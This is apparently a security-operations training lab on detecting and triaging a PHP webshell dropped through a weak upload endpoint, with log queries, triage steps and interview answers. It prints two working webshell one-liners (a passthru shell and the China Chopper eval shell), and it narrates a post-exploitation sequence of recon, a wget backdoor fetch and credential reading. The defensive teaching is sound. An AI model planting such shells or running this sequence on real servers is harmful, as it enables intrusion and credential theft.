# Lab 06: Webshell Drop

## Attack Narrative

Public-facing site `example-ops.com` runs `upload.php` with insufficient input validation. The endpoint trusts `$_FILES['file']['type']` from the client (a known anti-pattern). An attacker from `185.220.101.45` (Tor exit) uploads `img_2026.php` to `/var/www/html/uploads/`.

The webshell is a one-liner: `<?php passthru($_GET['cmd']); ?>`.

The attacker then runs commands via GET requests:
- `whoami`, `id`, `uname -a` (recon)
- `cat /etc/passwd`, `ls /var/www` (enumeration)
- `wget` to pull a backdoor binary
- `chmod +x` and execute the binary
- `cat /home/www/config.php` (database creds)

The error log reveals the upload path, the PHP warnings from the malformed shell, and the egress failure attempting to fetch the backdoor.

## Detection Logic

Three signal sources, all complementary.

1. Access log: GET to .php in upload-like directory with cmd-like params. Sigma rule fires.
2. Error log: PHP warnings about undefined variables in upload paths, file_get_contents to external URLs.
3. Filesystem (auditd or Falco): write of .php to webroot from the web server user.

The third source is the strongest because it catches the drop itself, before the attacker interacts with the shell. But access logs are universally available and cheap to query, so they are the workhorse.

## Run It

```bash
cd labs/lab_06_webshell_drop

# Suspicious URI patterns
grep -E 'uploads.*\.php\?(cmd|c|exec|shell|pwd|eval)=' access.log

# Top sources hitting the upload directory
awk '/uploads\/.*\.php/ {print $1}' access.log | sort | uniq -c | sort -rn

# Decoded params (URL-decode for readability)
grep -oP 'uploads/\S+\.php\?\S+' access.log | python3 -c "import sys, urllib.parse as u; [print(u.unquote(l.strip())) for l in sys.stdin]"

# Error log webshell indicators
grep -E '(passthru|eval|exec|system)\(\)' error.log
grep -E 'PHP Warning|PHP Notice' error.log
```

## Triage Outcome

Verdict: True Positive, Critical.

Page oncall. Take the host offline or pull from the load balancer. Remove `/var/www/html/uploads/img_2026.php`. Remove `/tmp/b` and any other dropped binaries. Image the host for forensics before remediation. Patch the upload validation: server-side MIME check, file extension allowlist, store uploads outside the webroot, never serve them via PHP. Rotate any DB or app credentials in `config.php`. Block 185.220.101.45 at edge. Hunt for similar patterns across other web hosts: `find /var/www -name "*.php" -newer <known-good-date>`.

## Interviewer Questions

- "What signals would you correlate?" Access log (the URI pattern), error log (PHP warnings, file_get_contents to public IPs), filesystem audit (the .php drop), Falco (`Write below etc` and `Spawned shell in container` rules), egress NetFlow (the wget to attacker-controlled IP).
- "How would you detect a webshell that does not use cmd in URL params?" Behavioral. Watch for the web server process (apache, nginx-worker, php-fpm) spawning unusual child processes (sh, bash, wget, curl, nc). That is auditd or Falco territory. The web server should never spawn shells.
- "What about encoded shells like the China Chopper one-liner?" That one is `<?php @eval($_POST[chopper]); ?>`. Detection at the access layer is harder because POST bodies are typically not logged. You need WAF logs (ModSec, Cloudflare WAF, AWS WAF) which capture POST. Or you need the egress detection.
- "What is the best preventative control?" Read-only file system for the webroot in production. Uploads to a separate object store (S3) that is served via a separate domain with no PHP execution. The upload directory in the webroot pattern is the bug.
- "Mention a recent webshell incident." MOVEit zero-day in 2023 by Cl0p. Initial access via SQL injection that wrote a .NET webshell (LEMURLOOT) to the MOVEit web directory. Detection at the file integrity monitoring layer would have caught it on day one. Most victims found out from Cl0p's leak site instead.
- "How does this map to ATT&CK?" T1505.003 (Server Software Component: Web Shell). T1059.004 (Unix Shell) for the commands run through the shell. T1071.001 (Web Protocols) for the C2 channel.

## Variant: Hardening the Detection

1. Web server process behavior monitoring via Falco. Default rule "Spawned shell in container" catches webshell execution at runtime.
2. WAF rules with OWASP CRS rule 932100 (Remote Command Execution: Unix Command Injection).
3. File integrity monitoring (Wazuh syscheck, Tripwire, AIDE) on `/var/www`. Any new .php file outside known paths is an alert.
4. Egress allowlist on web hosts. Block all outbound except to known endpoints.
